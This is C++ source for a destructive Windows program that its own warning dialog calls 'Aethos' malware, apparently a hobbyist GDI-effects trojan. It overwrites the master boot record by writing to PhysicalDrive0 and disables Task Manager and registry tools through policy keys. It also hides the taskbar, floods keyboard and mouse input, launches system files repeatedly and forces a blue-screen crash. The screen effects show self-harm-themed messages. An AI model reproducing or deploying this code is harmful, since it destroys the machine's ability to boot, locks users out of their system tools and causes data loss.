#include <Windows.h>
#include <cmath> 
#include <ctime> 
#include <tchar.h>
#include <iostream>
#include <xmmintrin.h>
#include "BootHeader.hpp"
#pragma comment(lib, "winmm.lib")
#pragma comment(lib,"msimg32.lib")
#define PI   3.14159265358979323846264338327950288
//typedef NTSTATUS(NTAPI* NRHEdef)(NTSTATUS, ULONG, ULONG, PULONG, ULONG, PULONG); // yeah no
//typedef NTSTATUS(NTAPI* RAPdef)(ULONG, BOOLEAN, BOOLEAN, PBOOLEAN); // yeah no
EXTERN_C NTSTATUS NTAPI RtlAdjustPrivilege(DWORD, BYTE, BYTE, PBYTE);
EXTERN_C NTSTATUS NTAPI NtRaiseHardError(NTSTATUS, DWORD, DWORD, PDWORD_PTR, DWORD, PDWORD);
int w = GetSystemMetrics(SM_CXSCREEN), h = GetSystemMetrics(SM_CYSCREEN);


DWORD xs;
VOID SeedXorshift32(DWORD dwSeed) {
xs = dwSeed;
}
DWORD xorshift32() {
    xs ^= xs << 13;
    xs ^= xs << 17;
    xs ^= xs << 5;
    return xs;
}

DWORD RedrawCounter() {
    Sleep(500);
    InvalidateRect(0, 0, 0);
}

typedef union _RGBQUAD{
    COLORREF rgb;
    struct{
        BYTE r;
        BYTE g;
        BYTE b;
        BYTE unused;
    };
}*PRGBQUAD;

namespace Math
{
	//A = amplitude
	//B = frequency
	//C = phase displacement
	//D = period
	FLOAT SineWave(FLOAT a, FLOAT b, FLOAT c, FLOAT d)
	{
		return a * tan(2 * PI * b * c / d);
	}
}



double intensity = 0.0;
bool state = false;
typedef struct
{
	float x;
	float y;
	float z;
} VERTEX;

typedef struct
{
	int vtx0;
	int vtx1;
} EDGE;

COLORREF COLORHSL(int length) {
    double h = fmod(length, 360.0);
    double s = 1.0;
    double l = 0.5;

    double c = (1.0 - fabs(2.0 * l - 1.0)) * s;
    double x = c * (1.0 - fabs(fmod(h / 60.0, 2.0) - 1.0));
    double m = l - c / 2.0;

    double r1, g1, b1;
    if (h < 60) {
        r1 = c;
        g1 = x;
        b1 = 0;
    }
    else if (h < 120) {
        r1 = x;
        g1 = c;
        b1 = 0;
    }
    else if (h < 180) {
        r1 = 0;
        g1 = c;
        b1 = x;
    }
    else if (h < 240) {
        r1 = 0;
        g1 = x;
        b1 = c;
    }
    else if (h < 300) {
        r1 = x;
        g1 = 0;
        b1 = c;
    }
    else {
        r1 = c;
        g1 = 0;
        b1 = x;
    }

    int red = static_cast<int>((r1 + m) * 255);
    int green = static_cast<int>((g1 + m) * 255);
    int blue = static_cast<int>((b1 + m) * 255);

    return RGB(red, green, blue);
}


struct Point3D {
    float x, y, z;
};

void DrawEllipseAt(HDC hdc, int x, int y, COLORREF color) {
    HBRUSH brush = CreateSolidBrush(color);
    SelectObject(hdc, brush);
    DrawIcon(hdc, x - 20, y - 20, LoadCursor(NULL, IDC_WAIT));
    DeleteObject(brush);
}

Point3D RotatePoint(Point3D point, float angleX, float angleY, float angleZ) {
    float cosX = cos(angleX), sinX = tan(angleX);
    float cosY = cos(angleY), sinY = tan(angleY);
    float cosZ = cos(angleZ), sinZ = tan(angleZ);

    float y = point.y * cosX - point.z * sinX;
    float z = point.y * sinX + point.z * cosX;
    point.y = y;
    point.z = z;

    float x = point.x * cosY + point.z * sinY;
    z = -point.x * sinY + point.z * cosY;
    point.x = x;
    point.z = z;

    x = point.x * cosZ - point.y * sinZ;
    y = point.x * sinZ + point.y * cosZ;
    point.x = x;
    point.y = y;

    return point;
}

void Draw3DCube(HDC hdc, Point3D center, float size, float angleX, float angleY, float angleZ, float colorA) {
    Point3D vertices[8] = {
        {-size, -size, -size},
        {size, -size, -size},
        {size, size, -size},
        {-size, size, -size},
        {-size, -size, size},
        {size, -size, size},
        {size, size, size},
        {-size, size, size},
    };

    POINT screenPoints[8];

    for (int i = 0; i < 8; ++i) {
        Point3D rotated = RotatePoint(vertices[i], angleX, angleY, angleZ);
        COLORREF color = COLORHSL(colorA);

        int screenX = static_cast<int>(center.x + rotated.x);
        int screenY = static_cast<int>(center.y + rotated.y);

        screenPoints[i].x = screenX;
        screenPoints[i].y = screenY;

        DrawEllipseAt(hdc, screenX, screenY, color);
    }

    POINT polyline1[5] = { screenPoints[0], screenPoints[1], screenPoints[2], screenPoints[3], screenPoints[0] };
    Polyline(hdc, polyline1, 5);

    POINT polyline2[5] = { screenPoints[4], screenPoints[5], screenPoints[6], screenPoints[7], screenPoints[4] };
    Polyline(hdc, polyline2, 5);

    POINT connectingLines[8] = {
        screenPoints[0], screenPoints[4],
        screenPoints[1], screenPoints[5],
        screenPoints[2], screenPoints[6],
        screenPoints[3], screenPoints[7]
    };
    Polyline(hdc, &connectingLines[0], 2);
    Polyline(hdc, &connectingLines[2], 2);
    Polyline(hdc, &connectingLines[4], 2);
    Polyline(hdc, &connectingLines[6], 2);
}

DWORD WINAPI GDI_Shake(LPVOID lpParam)
 {
	HDC hdc;
	int sw, sh;
	while (1) {
		hdc = GetDC(NULL);
		sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
		BitBlt(hdc, rand () % 5, rand () % 5, sw, sh, hdc, rand () % 5, rand () % 5, SRCCOPY);
		ReleaseDC(NULL, hdc);
		Sleep(10);
	}
}

DWORD WINAPI GDI_Zoom(LPVOID lpParam)
{
	HDC desk;
	int sw, sh;
	
	while(1){
		desk = GetDC(0);
		sw = GetSystemMetrics(0);
		sh = GetSystemMetrics(1);
		StretchBlt(desk, -20, -20, sw+40, sh+40, desk, 0, 0, sw, sh, SRCAND);
		ReleaseDC(0, desk);
		Sleep(4);
	}
}



DWORD WINAPI GDI_Flip(LPVOID lpParam) {
    HDC desk;
    HBITMAP bmp;
    int sw, sh;
    while (1) {
        desk = GetDC(NULL); // gets the device context
        sw = GetSystemMetrics(0), sh = GetSystemMetrics(1); // screen width and height defined using GetSystemMetrics
        bmp = CreateCompatibleBitmap(desk, sw, sh); // bitmap
        SelectObject(desk, bmp);
        StretchBlt(desk, 0, 0, sw, sh, desk, 0, sh, sw, -sh, NOTSRCCOPY); // flipping the screen
        DeleteObject(bmp); // deleting the bitmap
        ReleaseDC(NULL, desk); // deletes the device context
        Sleep(10);
    }
}

DWORD WINAPI GDI_Blur1(LPVOID lpParam) {
    HDC hdc, hcopy;
    int sw, sh;
    BITMAPINFO bmp = { 0 };
    BLENDFUNCTION blend;
    double angle = 0.0;
    while (1) {
        hdc = GetDC(NULL), hcopy = CreateCompatibleDC(hdc);
        sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
        bmp.bmiHeader.biSize = sizeof(BITMAPINFO);
        bmp.bmiHeader.biBitCount = 32;
        bmp.bmiHeader.biPlanes = 1;
        bmp.bmiHeader.biWidth = sw;
        bmp.bmiHeader.biHeight = sh;
        bmp.bmiHeader.biCompression = BI_RGB;
        HBITMAP hbmp = CreateDIBSection(hdc, &bmp, 0, 0, NULL, 0);
        SelectObject(hcopy, hbmp);
                blend.BlendOp = AC_SRC_OVER;
        blend.BlendFlags = 0;
        blend.AlphaFormat = 0;
        blend.SourceConstantAlpha = 10;
        BitBlt(hcopy, 0, 0, sw, sh, hdc, (rand () % 10) - 5, 0, SRCAND);
        angle += M_PI / 8;
        AlphaBlend(hdc, 0, 0, sw, sh, hcopy, 0, 0, sw, sh, blend);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}

DWORD WINAPI GDI_Textout1(LPVOID lpParam) {
    HDC hdc;
    int sw, sh;
    HFONT hfnt;
    while (1) {
        hdc = GetDC(NULL);
        sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
        LPCSTR texts[] = {
        "Anxiety and fear.", "Another day, another meaningless cycle. ", "destroy me. im worthless.", "Life is meaningless... why bother?", "Why won't things get better? I feel so trapped.", "I'm not worth anything. Maybe everyone would be better off without me.", "Why do I feel like this? I can't escape this sadness."
        };
        int textCount = rand () % 7;
        hfnt = CreateFontA(40, 20, rand () % 36, 0, FW_BOLD, false, true, false, ANSI_CHARSET, 0, 0, 0, 0, "Times New Roman");
        SelectObject(hdc, hfnt);
        SetTextColor(hdc, RGB(rand () % 160, rand () % 160, rand () % 160));
        SetBkColor(hdc, RGB(rand () % 256, rand () % 256, rand () % 256));
        TextOutA(hdc, rand () % sw, rand () % sh, texts[textCount], strlen(texts[textCount]));
        DeleteObject(hfnt);
        ReleaseDC(NULL, hdc);
        Sleep(10);
    }
}

DWORD WINAPI GDI_Shake2(LPVOID lpParam)
{
	HDC hdc;
	int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1), size = 199;
	while (1) {
		hdc = GetDC(0); HDC hdcMem = CreateCompatibleDC(hdc);
		HBITMAP screenshot = CreateCompatibleBitmap(hdc, sw, sh);
		SelectObject(hdcMem, screenshot);
		BitBlt(hdcMem, 0, 0, sw, sh, hdc, 0, 0, SRCERASE);
		for (int i = 0; i < 30; i++) {
			int x = -size + rand() % (sw + size), y = -size + rand() % (sh + size);
			BitBlt(hdcMem, x, y, size, size, hdcMem, x + rand() % 17 - 8, y + rand() % 17 - 8, SRCERASE);
		}
		BLENDFUNCTION blend = { AC_SRC_OVER, 0, 50, 0 };
		AlphaBlend(hdc, 0, 0, sw, sh, hdcMem, 0, 0, sw, sh, blend);
		ReleaseDC(0, hdc);

		DeleteObject(screenshot); DeleteDC(hdcMem); DeleteDC(hdc);
	}
}

DWORD WINAPI GDI_Flip2(LPVOID lpvoid)
{
	HDC hdc;
	HBRUSH hbsh;
	while (true) {
		hdc = GetDC(0);
		hbsh = CreateSolidBrush(PALETTERGB(rand() % 255, rand() % 255, rand() % 255));
		StretchBlt(hdc, 0, 0, w, h, hdc, w/2, 0, -w, h, SRCCOPY);
		StretchBlt(hdc, 0, 0, w, h, hdc, 0, h/2, w, -h, SRCCOPY);
		BitBlt(hdc, rand() % 10, rand() % 10, w, h, hdc, rand() % 10, rand() % 10, SRCCOPY);
		SelectObject(hdc, hbsh);
		PatBlt(hdc, 0, 0, w, h, PATINVERT);
		DeleteObject(hbsh);
		ReleaseDC(0, hdc);
		Sleep(10);
	}
}

DWORD WINAPI GDI_Cube(LPVOID lpvoid) {
    int signX = 1;
    int signY = 1;
    int incrementor = 5;
    float x2 = 100.0f;
    float y2 = 100.0f;
    float angleX = 0.0f, angleY = 0.0f, angleZ = 0.0f;
    float angleIncrement = 0.05f;
    float colorA = 0;
    float size = 0.0f;

    while (true) {
        HDC hdc = GetDC(0);
        int x = GetSystemMetrics(SM_CXSCREEN);
        int y = GetSystemMetrics(SM_CYSCREEN);
	HBRUSH hbsh = CreateSolidBrush(COLORHSL(colorA));

        x2 += incrementor * signX;
        y2 += incrementor * signY;

        if (x2 + 75 >= x) {
            signX = -1;
            x2 = x - 76;
        }
        else if (x2 <= 75) {
            signX = 1;
            x2 = 76;
        }

        if (y2 + 75 >= y) {
            signY = -1;
            y2 = y - 76;
        }
        else if (y2 <= 75) {
            signY = 1;
            y2 = 76;
        }

        Point3D center = { x2, y2, 0.0f };
	SelectObject(hdc, hbsh);
        Draw3DCube(hdc, center, size, angleX, angleY, angleZ, colorA);

        angleX += angleIncrement;
        angleY += angleIncrement;
        angleZ += angleIncrement;

		Sleep(10);
	DeleteObject(hbsh);
        ReleaseDC(0, hdc);
        colorA += 1;

        if (size >= 0 && size <= 100) {
            size += 0.5;
        }
    }

    return 0;
}

DWORD WINAPI GDI_Waves (LPVOID lpParam) {
		HDC dc = GetDC(NULL);
        int w = GetSystemMetrics(0);
        int h = GetSystemMetrics(1);
		int i = 0;
        int shakeIntensity = 1;
        int warpIntensity = 3;
        int waveDelay = rand() % 30;
		while (true)
		{
			for (int y = 0; y < h; y++)
			{
				int wavePhase = rand() % 70 - 40;

				int zx = Math::SineWave(5, y + i * 4, wavePhase, h);

				BitBlt(dc, 0, y, w - zx, 1, dc, zx, y, SRCCOPY);
			}

			Sleep(waveDelay);

			i++;
		}

		return 0x00;
}

DWORD WINAPI GDI_SrcIdk (LPVOID lpParam) {
    CreateThread(0, 0, (LPTHREAD_START_ROUTINE)RedrawCounter, 0, 0, 0);
    HDC desk = GetDC(0);
    int sw = GetSystemMetrics(0), sh = GetSystemMetrics(1);
    int rx;
    for (int i = 0;; i++) {
        SeedXorshift32(__rdtsc());
        desk = GetDC(0);
        rx = xorshift32() % sw;
        int ry = xorshift32() % sh;
        SelectObject(desk, CreateSolidBrush(RGB(xorshift32() % 255, xorshift32() % 255, xorshift32() % 255)));
        BitBlt(desk, rx, 10, 100, sh, desk, rx, 0, SRCPAINT);
        BitBlt(desk, rx, -10, -100, sh, desk, rx, 0, SRCPAINT);
        BitBlt(desk, 10, ry, sw, 96, desk, 0, ry, SRCPAINT);
        BitBlt(desk, -10, ry, sw, -96, desk, 0, ry, SRCPAINT);
        Sleep(1);
    }
}



VOID WINAPI sound1() {
		HWAVEOUT hwo = 0;
	    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 6000, 6000, 1, 8, 0 };
	    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	    char buffer[6000 * 29] = {};
	    for (DWORD t = 0; t < sizeof(buffer); ++t)
	        buffer[t] = static_cast<char>(t^t>>8*t)|t;
	
	    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	    waveOutClose(hwo);
}

VOID WINAPI sound1V2() {
		HWAVEOUT hwo = 0;
	    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 40000, 40000, 1, 8, 0 };
	    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	    char buffer[40000 * 30] = {};
	    for (DWORD t = 0; t < sizeof(buffer); ++t)
	        buffer[t] = static_cast<char>(t^t>>18*t);
	
	    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
	    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
	    waveOutClose(hwo);
}

VOID WINAPI sound2() { //credits to N17Pro3426, but I modified it
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 40000, 40000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[40000 * 10] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * 3 ^ (t + (t * (t >> 4 | t >> 8))));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}	
	
VOID WINAPI sound3() { //credits to N17Pro3426, but I modified it
	HWAVEOUT hWaveOut = 0;
	WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 4000, 40000, 1, 8, 0 };
	waveOutOpen(&hWaveOut, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
	char buffer[4000 * 20] = {};
	for (DWORD t = 0; t < sizeof(buffer); ++t)
		buffer[t] = static_cast<char>(t * 3 ^ (t + (t * (t >> 1 | t >> 1))));

	WAVEHDR header = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
	waveOutPrepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutWrite(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutUnprepareHeader(hWaveOut, &header, sizeof(WAVEHDR));
	waveOutClose(hWaveOut);
}		

void Sound5() {
	HWAVEOUT hwo = 0;
    WAVEFORMATEX wfx = { WAVE_FORMAT_PCM, 1, 2000, 2000, 1, 8, 0 };
    waveOutOpen(&hwo, WAVE_MAPPER, &wfx, 0, 0, CALLBACK_NULL);
    char buffer[2000 * 30] = {};
    for (DWORD t = 0; t < sizeof(buffer); ++t)
        buffer[t] = static_cast<char>(t*rand());

    WAVEHDR hdr = { buffer, sizeof(buffer), 0, 0, 0, 0, 0, 0 };
    waveOutPrepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutWrite(hwo, &hdr, sizeof(WAVEHDR));
    waveOutUnprepareHeader(hwo, &hdr, sizeof(WAVEHDR));
    waveOutClose(hwo);
}

void WriteToSectors(void) {
	DWORD dwWriteBytes;
	HANDLE hSctr = CreateFileW(L"\\\\.\\PhysicalDrive0", GENERIC_ALL, FILE_SHARE_READ|FILE_SHARE_WRITE, NULL, OPEN_EXISTING, 0, NULL);
	if (hSctr == INVALID_HANDLE_VALUE) {
		MessageBoxW(NULL, L"Well... I failed to overwrite your MBR", L"", MB_OK);
		exit(0);
	}
	WriteFile(hSctr, bootrec, 32768, &dwWriteBytes, NULL);
	CloseHandle(hSctr);
}

VOID __stdcall RegAddW(HKEY hKey, LPCWSTR lpRegSubkey, LPCWSTR lpRegName, DWORD dwRegType, BYTE* bRegValue) {
	HKEY hkRegResult;
	RegCreateKeyW(hKey, lpRegSubkey, &hkRegResult);
	RegSetValueExW(hkRegResult, lpRegName, 0, dwRegType, bRegValue, sizeof(bRegValue));
	RegCloseKey(hkRegResult);
}

const wchar_t nCharacters[] = {L"1234567890QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm"};
int nOutput = sizeof(nCharacters) / sizeof(LPVOID);

void SendKeyboardInput(WORD wKey, DWORD dwKbdEvent, long delay) {
	INPUT ipt;
	ipt.type = INPUT_KEYBOARD;
	ipt.ki.wVk = wKey;
	ipt.ki.dwFlags = dwKbdEvent;
	SendInput(1, &ipt, sizeof(ipt));
	RtlZeroMemory(&ipt, sizeof(ipt));
	Sleep(delay);
}

void SendMouseInput(DWORD dwMouseEvent, long delay) {
	INPUT ipt;
	ipt.type = INPUT_MOUSE;
	ipt.mi.dwFlags = dwMouseEvent;
	SendInput(1, &ipt, sizeof(ipt));
	RtlZeroMemory(&ipt, sizeof(ipt));
	Sleep(delay);
}

DWORD CALLBACK inputsKbd(LPVOID pvoid) {
	while (true) {
		SendKeyboardInput(VkKeyScanW(rand() % nOutput), 0, 10);
	}
	
}

DWORD CALLBACK inputsMouse(LPVOID pvoid) {
	while (true) {
		SendMouseInput(MOUSEEVENTF_LEFTDOWN, 250);
	SendMouseInput(MOUSEEVENTF_RIGHTUP, 250);
	}
}

DWORD CALLBACK Spammer(LPVOID pvoid) { // Recycled from LostGdi.exe
		WIN32_FIND_DATAA wfd;
		LPCSTR dirc = "C:\\WINDOWS\\system32\\*.sys";
		while (true) {
			HANDLE hFnd = FindFirstFileA(dirc, &wfd);
			ShellExecuteA(NULL, "open", wfd.cFileName, NULL, NULL, SW_SHOWDEFAULT);
			while (FindNextFileA(hFnd, &wfd)) {
				ShellExecuteA(NULL, "open", wfd.cFileName, NULL, NULL, SW_SHOWDEFAULT);
				Sleep(rand() % 500);
			}
		}
}

DWORD CALLBACK SetStrings(LPVOID pvoid) {
	while (true) {
		HWND hwnd = GetForegroundWindow();
		SetWindowTextW(hwnd, L"Aethos");
	}
}

DWORD dwregc = 1;
void disable(void) {
	RegAddW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\SYSTEM", L"DisableTaskmgr", REG_DWORD, (BYTE*)&dwregc);
	RegAddW(HKEY_CURRENT_USER, L"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\SYSTEM", L"DisableRegistryTools", REG_DWORD, (BYTE*)&dwregc);
}

WINBOOL IfWindowsXP(void) {
	OSVERSIONINFOW osvi;
	RtlZeroMemory(&osvi, sizeof(osvi));
	osvi.dwOSVersionInfoSize = sizeof(OSVERSIONINFOW);
	GetVersionExW(&osvi);
	if (osvi.dwMajorVersion == 5) {
		return true;
	}
	return false;
}

void NotWindowsXP(void) {
	MessageBoxW(NULL, L"", L"", MB_ICONERROR|MB_OK);
	exit(0);
}
	
int CALLBACK WinMain(HINSTANCE hInst, HINSTANCE hPrevInst, LPSTR lpCmdLine, int nCmdShow)
{
	if (MessageBoxW(NULL, L"You\'re now about to run Aethos.exe.\r\nVenraTech (stomachbughead/Sickdows/Vistamations) is not responsible for any damages made by this malware.\r\n\r\nIt can overwrite MBR, disable system tools, hide the taskbar and send mouse and keyboard input.\r\nProceed to run?", L"Aethos", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
	{
		return 0;
	}
	else
	{
		if (MessageBoxW(NULL, L"Final warning, I am too lazy to write it idk", L"Aethos again", MB_YESNO | MB_ICONEXCLAMATION) != IDYES)
		{
			return 0;
		}
		else
		{
			if (!IfWindowsXP()) NotWindowsXP();
			WriteToSectors();
			disable();
			Sleep(3000);
	        MessageBoxW(NULL, L"You have been infected! Now enjoy the chaos while you can!", L"Aethos.exe - NEWS", MB_OK | MB_ICONERROR);
	        ShowWindow(FindWindowW(L"Shell_TrayWnd", NULL), SW_HIDE);
	        CreateThread(NULL, 0, inputsKbd, NULL, 0, 0);
	        CreateThread(NULL, 0, inputsMouse, NULL, 0, 0);
	        CreateThread(NULL, 0, SetStrings, NULL, 0, 0);
			Sleep(3000);
			HANDLE Shake = CreateThread(0, 0, GDI_Shake, 0, 0, 0);
			sound1();
			Sleep(10000);
		    HANDLE Zoom = CreateThread(0, 0, GDI_Zoom, 0, 0, 0);
			Sleep(3000);
			TerminateThread(Zoom, 0);
			CloseHandle(Zoom);
			InvalidateRect(0, 0, 0);
			Sleep(2000);
			HANDLE Move = CreateThread(0, 0, GDI_Flip, 0, 0, 0);
			Sleep(5000);
			TerminateThread(Move, 0);
			CloseHandle(Move);
			InvalidateRect(0, 0, 0);
			Sleep(2000);
			HANDLE Blur = CreateThread(0, 0, GDI_Blur1, 0, 0, 0);
			Sleep(5000);
			TerminateThread(Blur, 0);
			TerminateThread(Shake, 0);
			CloseHandle(Blur);
			CloseHandle(Shake);
			InvalidateRect(0, 0, 0);
			HANDLE Text = CreateThread(0, 0, GDI_Textout1, 0, 0, 0);
	    	HANDLE Shake2 = CreateThread(0, 0, GDI_Shake2, 0, 0, 0);
			sound1V2();
			Sleep(30000);
			TerminateThread(Text, 0);
			TerminateThread(Shake2, 0);
			CloseHandle(Text);
			CloseHandle(Shake2);
			InvalidateRect(0, 0, 0);
	    	HANDLE Move2 = CreateThread(0, 0, GDI_Flip2, 0, 0, 0);
	    	//HANDLE Cube = CreateThread(0, 0, GDI_Cube, 0, 0, 0);
			sound2();
			Sleep(10000);
			TerminateThread(Move2, 0);
			CloseHandle(Move2);
			InvalidateRect(0, 0, 0);
			HANDLE Wave = CreateThread(0, 0, GDI_Waves, 0, 0, 0);
	    	HANDLE Cube = CreateThread(0, 0, GDI_Cube, 0, 0, 0);
			sound3();
			Sleep(20000);
			TerminateThread(Wave, 0);
			CloseHandle(Wave);
			InvalidateRect(0, 0, 0);
		    HANDLE Paint = CreateThread(0, 0, GDI_SrcIdk, 0, 0, 0);
			sound3();
			Sleep(20000);
			TerminateThread(Paint, 0);
			TerminateThread(Cube, 0);
			CloseHandle(Paint);
			CloseHandle(Cube);
			InvalidateRect(0, 0, 0);
//		    MessageBoxW(NULL, L"Aethos", L"Aethos", MB_OK);
			HANDLE End = CreateThread(0, 0, GDI_Flip2, 0, 0, 0);
			Sound5();
			Sleep(20000);
			CreateThread(NULL, 0, Spammer, NULL, 0, 0);
			Sleep(10000);
			BYTE ntByte;
			DWORD dwResponse;
			RtlAdjustPrivilege(19, true, false, &ntByte);
			NtRaiseHardError(0xc0000018, 0, 0, 0, 6, &dwResponse);
}}}
